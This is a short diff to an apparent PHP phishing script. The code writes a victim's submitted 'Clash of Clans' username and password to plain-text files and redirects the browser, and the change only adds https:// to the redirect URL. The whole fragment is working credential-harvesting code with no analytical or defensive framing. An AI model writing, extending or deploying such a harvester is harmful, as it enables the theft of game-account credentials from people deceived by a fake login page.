@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Clash of clans Username : " . $email = $_POS
 ?>
 <?php
 file_put_contents("pass.txt", "Clash of clans Password : " . $password = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
